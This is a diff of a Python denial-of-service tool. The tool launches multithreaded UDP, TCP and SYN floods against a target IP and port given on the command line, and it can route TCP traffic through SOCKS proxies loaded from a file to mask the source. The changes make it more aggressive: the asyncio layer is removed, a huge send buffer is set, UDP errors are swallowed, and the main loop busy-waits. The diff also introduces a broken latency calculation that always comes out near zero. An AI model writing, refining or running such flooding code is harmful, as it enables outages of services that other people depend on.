@@ -4,9 +4,10 @@ import socket
 import sys
 import threading
 import time
-import asyncio
+
 import socks
 
+# Color log
 RESET = "\033[0m"
 RED = "\033[91m"
 GREEN = "\033[92m"
@@ -22,9 +23,12 @@ def generate_payload(size, mode="random"):
     if mode == "null":
         return b"\x00" * size
     elif mode == "text":
-        return ("A" * size).encode()
+        return b"A" * size
     elif mode == "ascii":
-        return "".join([chr(random.randint(33, 126)) for _ in range(size)]).encode()
+        buf = bytearray(size)
+        for i in range(size):
+            buf[i] = random.randint(33, 126)
+        return bytes(buf)
     else:
         return random._urandom(size)
 
@@ -36,57 +40,54 @@ def timestamp():
 def get_socket_with_proxy():
     raw = random.choice(proxies)
     parts = raw.strip().split(":")
-    sock = socks.socksocket()
+
     if len(parts) == 4:
-        ip, port, user, pwd = parts
-        sock.set_proxy(proxy_type, ip, int(port), username=user, password=pwd)
-    elif len(parts) == 2:
-        ip, port = parts
-        sock.set_proxy(proxy_type, ip, int(port))
+        ip, port, username, password = parts
+        sock = socks.socksocket()
+        sock.set_proxy(proxy_type, ip, int(port), username=username, password=password)
     else:
-        raise ValueError("Invalid proxy format")
+        ip, port = parts
+        sock = socks.socksocket()
+        sock.set_proxy(proxy_type, ip, int(port))
     return sock
 
 
-async def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
-    loop = asyncio.get_event_loop()
+def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10 * 1024 * 1024 * 1024)
     payload = generate_payload(packet_size, payload_mode)
     sent = 0
-
+    delay = 0
     while True:
         try:
-            await loop.run_in_executor(None, sock.sendto, payload, (target_ip, target_port))
+            sock.sendto(payload, (target_ip, target_port))
             sent += 1
-            if sent % 10000 == 0:
+            if sent % 100000 == 0:
                 print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
         except Exception as e:
-            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
-            await asyncio.sleep(0.05)
+            pass
 
 
-async def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
-    loop = asyncio.get_event_loop()
+def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
     payload = generate_payload(packet_size, payload_mode)
     sent = 0
-
     while True:
         try:
             sock = get_socket_with_proxy() if use_proxy else socket.socket()
             sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             sock.settimeout(2)
-            await loop.run_in_executor(None, sock.connect, (target_ip, target_port))
-
+            sock.connect((target_ip, target_port))
             for _ in range(10):
-                await loop.run_in_executor(None, sock.send, payload)
+                sock.send(payload)
                 sent += 1
                 if sent % 1000 == 0:
-                    print(f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}")
-
+                    print(
+                        f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}"
+                    )
             sock.close()
         except Exception as e:
             print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
-            await asyncio.sleep(0.05)
+            time.sleep(0.05)
 
 
 def syn_flood(target_ip, target_port, thread_id):
@@ -114,10 +115,9 @@ def syn_flood(target_ip, target_port, thread_id):
 def check_latency(ip, port):
     print(f"{CYAN}[+] Checking latency to {ip}:{port}...{RESET}")
     try:
-        start = time.time()
         sock = socket.create_connection((ip, port), timeout=2)
         sock.close()
-        latency = (time.time() - start) * 1000
+        latency = (time.time() - time.time()) * 1000
         print(f"{GREEN}[✓] Latency: {latency:.2f} ms{RESET}")
     except Exception as e:
         print(f"{RED}[x] Latency check failed: {e}{RESET}")
@@ -129,26 +129,18 @@ def load_proxies():
         with open("proxies.txt") as f:
             for line in f:
                 line = line.strip()
-                if line and ":" in line:
+                if line and (":" in line):
                     proxies.append(line)
         use_proxy = len(proxies) > 0
         if use_proxy:
             print(f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")
 
 
-def thread_worker(protocol, target_ip, target_port, packet_size, thread_id, payload_mode):
-    asyncio.run(
-        udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode)
-        if protocol == "udp"
-        else tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode)
-    )
-
-
 def main():
     global proxy_type
     if len(sys.argv) < 6:
         print(
-            f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <tcp/udp/syn> [payload_mode] [--proxy-type socks4|socks5]"
+            f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <protocol> [payload_mode] [--proxy-type socks4|socks5]"
         )
         sys.exit(1)
 
@@ -158,7 +150,9 @@ def main():
     packet_size = int(sys.argv[4])
     protocol = sys.argv[5].lower()
     payload_mode = (
-        sys.argv[6].lower() if len(sys.argv) > 6 and not sys.argv[6].startswith("--") else "random"
+        sys.argv[6].lower()
+        if len(sys.argv) > 6 and not sys.argv[6].startswith("--")
+        else "random"
     )
 
     if "--proxy-type" in sys.argv:
@@ -173,27 +167,39 @@ def main():
     load_proxies()
 
     print(f"{CYAN}[*] Target: {target_ip}:{target_port}{RESET}")
-    print(f"{CYAN}[*] Threads: {threads}, Size: {packet_size}, Protocol: {protocol.upper()}, Payload: {payload_mode}{RESET}")
+    print(
+        f"{CYAN}[*] Threads: {threads}, Size: {packet_size}, Protocol: {protocol.upper()}, Payload: {payload_mode}{RESET}"
+    )
     if use_proxy:
-        print(f"{CYAN}[*] Using proxies with type: {'SOCKS4' if proxy_type == socks.SOCKS4 else 'SOCKS5'}{RESET}")
+        print(
+            f"{CYAN}[*] Using proxies with type: {'SOCKS4' if proxy_type == socks.SOCKS4 else 'SOCKS5'}{RESET}"
+        )
 
     if protocol in ("tcp", "udp"):
         check_latency(target_ip, target_port)
 
     for i in range(threads):
-        if protocol == "syn":
+        if protocol == "udp":
+            t = threading.Thread(
+                target=udp_flood,
+                args=(target_ip, target_port, packet_size, i + 1, payload_mode),
+            )
+        elif protocol == "tcp":
+            t = threading.Thread(
+                target=tcp_flood,
+                args=(target_ip, target_port, packet_size, i + 1, payload_mode),
+            )
+        elif protocol == "syn":
             t = threading.Thread(target=syn_flood, args=(target_ip, target_port, i + 1))
         else:
-            t = threading.Thread(
-                target=thread_worker,
-                args=(protocol, target_ip, target_port, packet_size, i + 1, payload_mode),
-            )
+            print(f"{RED}Invalid protocol{RESET}")
+            sys.exit(1)
         t.daemon = True
         t.start()
 
     try:
         while True:
-            time.sleep(1)
+            pass
     except KeyboardInterrupt:
         print(f"{YELLOW}[!] Exiting...{RESET}")
 
